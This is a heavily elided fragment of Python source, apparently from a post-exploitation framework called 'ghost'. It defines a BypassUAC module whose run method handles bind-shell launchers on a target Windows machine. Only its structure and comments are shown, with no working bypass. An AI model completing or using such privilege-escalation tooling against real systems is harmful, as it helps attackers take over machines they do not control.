...
from ghost.network.lib.rpc.utils.classic import upload
...
class BypassUAC(GhostModule):
    ...
    def run(self, args):
        ...
        # Case of a ghost bind shell if ps1 mode is used
        # (no reverse connection possible)
        if launcher_type == 'bind':
            self.info(
                'The current ghost launcher is using a BIND connection. '
        ...
        if not args.exe and not args.restart:
            ...
            if is_bind_launcher:
                ...
                # as the initial ghost launcher on the target
